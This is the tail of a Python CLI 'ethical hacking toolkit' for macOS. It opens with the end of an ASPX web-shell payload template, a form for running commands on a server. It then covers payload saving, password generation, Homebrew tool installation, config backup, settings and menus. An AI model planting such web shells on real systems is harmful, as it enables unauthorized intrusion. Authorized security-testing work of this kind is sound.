    <form id="form1" runat="server">
        <div>
            <asp:TextBox ID="txtCommand" runat="server" Width="500px"></asp:TextBox>
            <asp:Button ID="btnExecute" runat="server" Text="Execute" OnClick="btnExecute_Click" />
            <br /><br />
            <asp:TextBox ID="txtOutput" runat="server" TextMode="MultiLine" 
                         Width="800px" Height="400px"></asp:TextBox>
        </div>
    </form>
</body>
</html>
"""

    return Payload(
        name=name,
        payload_type=payload_type,
        target_platform=target_platform,
        content=content,
    )


def save_payload(payload: Payload) -> str:
    ext = "txt"
    if payload.target_platform in ["linux", "windows"]:
        ext = "sh" if payload.target_platform == "linux" else "ps1"
    elif payload.target_platform == "php":
        ext = "php"
    elif payload.target_platform == "aspx":
        ext = "aspx"

    filename = f"{payload.name}.{ext}"
    filepath = PAYLOADS_DIR / filename

    with open(filepath, "w") as f:
        f.write(payload.content)

    return str(filepath)


def display_payload(payload: Payload):
    console.print()
    language = "bash"
    if payload.target_platform == "windows":
        language = "powershell"
    elif payload.target_platform == "php":
        language = "php"
    elif payload.target_platform == "aspx":
        language = "html"

    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Type:[/] {payload.payload_type}\n"
            f"[bold {NordColors.FROST_2}]Platform:[/] {payload.target_platform}\n"
            f"[bold {NordColors.FROST_2}]Generated:[/] {payload.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title=f"Payload: {payload.name}",
        border_style=NordColors.RED,
    )
    console.print(panel)

    from rich.syntax import Syntax
    console.print(Syntax(payload.content, language, theme="nord", line_numbers=True))
    console.print(f"[bold {NordColors.YELLOW}]DISCLAIMER:[/] This payload is for educational purposes only.")


def generate_passwords(length: int, complexity: int, count: int) -> List[str]:
    passwords = []

    lowercase = "abcdefghijklmnopqrstuvwxyz"
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    digits = "0123456789"
    special = "!@#$%^&*()-_=+[]{}|;:,.<>?/"

    for _ in range(count):
        charset = lowercase

        if complexity >= 2:
            charset += uppercase + digits

        if complexity >= 3:
            charset += special

        # Ensure at least one character from each required charset
        password = []
        if complexity >= 2:
            password.append(random.choice(lowercase))
            password.append(random.choice(uppercase))
            password.append(random.choice(digits))

        if complexity >= 3:
            password.append(random.choice(special))

        # Fill the rest with random characters
        remaining_length = length - len(password)
        password.extend(random.choice(charset) for _ in range(remaining_length))

        # Shuffle the password
        random.shuffle(password)
        passwords.append(''.join(password))

    return passwords


def display_passwords(passwords: List[str]):
    console.print()
    table = Table(title="Generated Passwords", show_header=True, header_style=f"bold {NordColors.FROST_1}")
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Password", style=NordColors.SNOW_STORM_1)
    table.add_column("Length", style=NordColors.FROST_3)

    for i, password in enumerate(passwords, 1):
        table.add_row(str(i), password, str(len(password)))

    console.print(table)

    if get_confirmation("Save passwords to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"passwords_{timestamp}.txt"
        filepath = PAYLOADS_DIR / filename

        with open(filepath, "w") as f:
            for password in passwords:
                f.write(f"{password}\n")

        print_success(f"Passwords saved to {filepath}")


def tool_management_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Manage security tools installation and status.",
        NordColors.FROST_4,
        "Tool Management"
    )

    options = [
        ("1", "Show Installed Tools", "View status of all security tools"),
        ("2", "Install Security Tools", "Install missing security tools via Homebrew"),
        ("3", "Backup Tool Configurations", "Backup tool configs to toolkit folder"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Tool Management Options", options))

    choice = get_integer_input("Select an option", 0, 3)
    if choice == 0:
        return
    elif choice == 1:
        show_installed_tools()
    elif choice == 2:
        install_security_tools()
    elif choice == 3:
        backup_tool_configurations()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def show_installed_tools():
    tool_status = {}
    all_tools = []

    for category, tools in SECURITY_TOOLS.items():
        for tool in tools:
            all_tools.append((category, tool))

    progress, task = display_progress(
        len(all_tools), "Checking installed tools", NordColors.FROST_4
    )

    with progress:
        for category, tool in all_tools:
            installed = shutil.which(tool) is not None
            if category not in tool_status:
                tool_status[category] = []
            tool_status[category].append((tool, installed))
            progress.update(task, advance=1)

    console.print()

    for category, tools in tool_status.items():
        table = Table(
            title=f"{category} Tools",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Tool", style=f"bold {NordColors.FROST_2}")
        table.add_column("Status", style=NordColors.SNOW_STORM_1)

        for tool, installed in tools:
            status = f"[bold {NordColors.GREEN}]● INSTALLED[/]" if installed else f"[dim {NordColors.RED}]○ NOT INSTALLED[/]"
            table.add_row(tool, status)

        console.print(table)


def install_security_tools():
    if shutil.which("brew") is None:
        display_panel(
            "Homebrew is not installed. Please install Homebrew from:\nhttps://brew.sh",
            NordColors.RED,
            "Error"
        )
        return

    tool_status = get_tool_status()
    missing_tools = [tool for tool, installed in tool_status.items() if not installed]

    if not missing_tools:
        display_panel(
            "All security tools are already installed!",
            NordColors.GREEN,
            "Tool Status"
        )
        return

    console.print(f"[bold {NordColors.FROST_2}]Missing Tools ({len(missing_tools)}):[/]")
    for i, tool in enumerate(missing_tools, 1):
        console.print(f"  {i}. {tool}")

    if not get_confirmation("Install missing tools using Homebrew?"):
        return

    brew_packages = {
        "docker": "docker",
        "wireshark": "--cask wireshark",
        "torbrowser-launcher": "--cask tor-browser",
    }

    progress, task = display_progress(
        len(missing_tools), "Installing tools", NordColors.FROST_4
    )

    installed = []
    failed = []

    with progress:
        for tool in missing_tools:
            brew_cmd = brew_packages.get(tool, tool)
            progress.update(task, description=f"Installing {tool}...")

            try:
                run_command(["brew", "install"] + brew_cmd.split(), capture_output=True, check=False)
                installed.append(tool)
            except Exception:
                failed.append(tool)

            progress.update(task, advance=1)

    if installed:
        display_panel(
            f"Successfully installed {len(installed)} tools:\n" + ", ".join(installed),
            NordColors.GREEN,
            "Installation Successful"
        )

    if failed:
        display_panel(
            f"Failed to install {len(failed)} tools:\n" + ", ".join(failed),
            NordColors.RED,
            "Installation Failed"
        )


def backup_tool_configurations():
    backup_dir = BASE_DIR / "tool_backups" / datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_dir.mkdir(parents=True, exist_ok=True)

    common_config_paths = {
        "nmap": "~/.nmap",
        "ssh": "~/.ssh/config",
        "bash": "~/.bash_profile",
        "zsh": "~/.zshrc",
        "vim": "~/.vimrc",
        "nikto": "/usr/local/etc/nikto.conf",
    }

    backed_up = []
    failed = []

    progress, task = display_progress(
        len(common_config_paths), "Backing up configurations", NordColors.FROST_4
    )

    with progress:
        for tool, path in common_config_paths.items():
            progress.update(task, description=f"Backing up {tool} config...")

            src_path = Path(os.path.expanduser(path))
            if src_path.exists():
                try:
                    dst_path = backup_dir / f"{tool}_config{src_path.suffix}"

                    if src_path.is_dir():
                        shutil.copytree(src_path, dst_path)
                    else:
                        shutil.copy2(src_path, dst_path)

                    backed_up.append(tool)
                except Exception as e:
                    failed.append((tool, str(e)))

            progress.update(task, advance=1)

    if backed_up:
        display_panel(
            f"Successfully backed up {len(backed_up)} configurations to:\n{backup_dir}\n\nTools: " + ", ".join(
                backed_up),
            NordColors.GREEN,
            "Backup Successful"
        )
    else:
        display_panel(
            "No configurations found to backup.",
            NordColors.YELLOW,
            "Backup Result"
        )

    if failed:
        table = Table(title="Backup Failures", show_header=True, header_style=f"bold {NordColors.RED}")
        table.add_column("Tool", style=f"bold {NordColors.FROST_2}")
        table.add_column("Error", style=NordColors.RED)

        for tool, error in failed:
            table.add_row(tool, error)

        console.print(table)


def display_help():
    console.clear()
    console.print(create_header())
    display_panel("Help and Documentation", NordColors.FROST_1, "Help Center")

    help_text = """
## Overview
macOS Ethical Hacking Toolkit is a CLI tool for security testing and ethical hacking.
It provides modules for network scanning, OSINT collection, enumeration, payload generation,
and direct interaction with popular security tools.

## Modules
1. **Network Scanning**: Discover active hosts and open ports
2. **OSINT Gathering**: Collect publicly available target information
3. **Username Enumeration**: Check for username availability across platforms
4. **Vulnerability Scanning**: Test for web vulnerabilities
5. **Payload Generation**: Create basic reverse and web shells
6. **Tool Management**: Install and manage security tools
7. **Settings**: Configure application settings

## Usage Tips
- Use Network Scanning to identify active hosts before further enumeration.
- OSINT module provides basic domain intelligence without needing API keys.
- Username Enumeration aids reconnaissance for social engineering.
- Tool Management helps you install missing security tools via Homebrew.
- Payload Generation creates basic testing payloads for authorized security assessments.

## Disclaimer
This tool is designed for ethical security testing only. 
Use it only on systems you have permission to test.
Unauthorized testing is illegal and unethical.
"""
    console.print(Markdown(help_text))
    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def settings_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Configure application settings and options.",
        NordColors.FROST_4,
        "Settings"
    )

    config = load_config()
    display_config(config)

    options = [
        ("1", "Change Number of Threads", "Configure parallel operation threads"),
        ("2", "Change Timeout", "Set operation timeout in seconds"),
        ("3", "Change User Agent", "Modify web request user agent"),
        ("4", "Reset to Default Settings", "Restore default configuration"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Settings Options", options))

    choice = get_integer_input("Select an option", 0, 4)
    if choice == 0:
        return
    elif choice == 1:
        threads = get_integer_input("Enter number of threads (1-50)", 1, 50)
        if threads > 0:
            config["threads"] = threads
            if save_config(config):
                print_success(f"Threads set to {threads}")
    elif choice == 2:
        timeout = get_integer_input("Enter timeout in seconds (1-120)", 1, 120)
        if timeout > 0:
            config["timeout"] = timeout
            if save_config(config):
                print_success(f"Timeout set to {timeout} seconds")
    elif choice == 3:
        console.print(f"[bold {NordColors.FROST_2}]Current User Agent:[/] {config.get('user_agent', 'Not set')}")
        console.print("Available User Agents:")
        for i, agent in enumerate(USER_AGENTS, 1):
            console.print(f"{i}. {agent}")
        console.print(f"{len(USER_AGENTS) + 1}. Custom User Agent")

        agent_choice = get_integer_input("Select a user agent", 1, len(USER_AGENTS) + 1)
        if agent_choice > 0:
            if agent_choice <= len(USER_AGENTS):
                config["user_agent"] = USER_AGENTS[agent_choice - 1]
            else:
                custom = get_user_input("Enter custom user agent")
                if custom:
                    config["user_agent"] = custom

            if save_config(config):
                print_success("User agent updated")
    elif choice == 4:
        if get_confirmation("Reset settings to default?"):
            default_config = {
                "threads": DEFAULT_THREADS,
                "timeout": DEFAULT_TIMEOUT,
                "user_agent": random.choice(USER_AGENTS),
            }

            if save_config(default_config):
                print_success("Settings reset to default")

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def load_config() -> Dict[str, Any]:
    config_file = CONFIG_DIR / "config.json"
    default = {
        "threads": DEFAULT_THREADS,
        "timeout": DEFAULT_TIMEOUT,
        "user_agent": random.choice(USER_AGENTS),
    }

    if not config_file.exists():
        with open(config_file, "w") as f:
            json.dump(default, f, indent=2)
        return default

    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except Exception as e:
        print_error(f"Error loading config: {e}")
        return default


def save_config(config: Dict[str, Any]) -> bool:
    config_file = CONFIG_DIR / "config.json"
    try:
        with open(config_file, "w") as f:
            json.dump(config, f, indent=2)
        return True
    except Exception as e:
        print_error(f"Error saving config: {e}")
        return False


def display_config(config: Dict[str, Any]):
    table = Table(
        title="Current Configuration",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Setting", style=f"bold {NordColors.FROST_2}")
    table.add_column("Value", style=NordColors.SNOW_STORM_1)

    for key, value in config.items():
        formatted = ", ".join(value) if isinstance(value, list) else str(value)
        table.add_row(key.replace("_", " ").title(), formatted)

    console.print(table)


def cleanup():
    print_message("Cleaning up resources...", NordColors.FROST_3)
    config = load_config()
    save_config(config)


def signal_handler(sig, frame):
    try:
        sig_name = signal.Signals(sig).name
        print_warning(f"Process interrupted by {sig_name}")
    except Exception:
        print_warning(f"Process interrupted by signal {sig}")
    cleanup()
    sys.exit(128 + sig)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)


def display_main_menu():
    console.clear()
    console.print(create_header())
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    console.print(
        Align.center(
            f"[{NordColors.SNOW_STORM_1}]Time: {current_time}[/] | [{NordColors.SNOW_STORM_1}]Host: {HOSTNAME}[/]"
        )
    )
    console.print()

    options = [
        ("1", "Network Scanning", "Discover hosts, open ports and services"),
        ("2", "OSINT Gathering", "Collect public intelligence about targets"),
        ("3", "Username Enumeration", "Check for username availability across platforms"),
        ("4", "Vulnerability Scanning", "Scan for vulnerabilities on target systems"),
        ("5", "Payload Generation", "Create basic shells and payloads"),
        ("6", "Tool Management", "Install and manage security tools"),
        ("7", "Settings", "Configure application settings"),
        ("8", "Help", "Display help and documentation"),
        ("0", "Exit", "Exit the application")
    ]

    console.print(create_menu_table("Main Menu", options))


def main():
    try:
        print_message(f"Starting {APP_NAME} v{VERSION}", NordColors.GREEN)

        while True:
            display_main_menu()
            choice = get_integer_input("Enter your choice", 0, 8)

            if choice == 0:
                console.clear()
                console.print(
                    Panel(
                        Text(f"Thank you for using {APP_NAME}!", style=f"bold {NordColors.FROST_2}"),
                        border_style=NordColors.FROST_1,
                        padding=(1, 2),
                    )
                )
                print_message("Exiting application", NordColors.FROST_3)
                break
            elif choice == 1:
                network_scanning_module()
            elif choice == 2:
                osint_gathering_module()
            elif choice == 3:
                username_enumeration_module()
            elif choice == 4:
                vulnerability_scanning_module()
            elif choice == 5:
                payload_generation_module()
            elif choice == 6:
                tool_management_module()
            elif choice == 7:
                settings_module()
            elif choice == 8:
                display_help()
    except KeyboardInterrupt:
        print_warning("Operation cancelled by user")
        display_panel("Operation cancelled", NordColors.YELLOW, "Cancelled")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unhandled error: {e}")
        display_panel(f"Unhandled error: {e}", NordColors.RED, "Error")
        console.print_exception()
        sys.exit(1)


if __name__ == "__main__":
    main()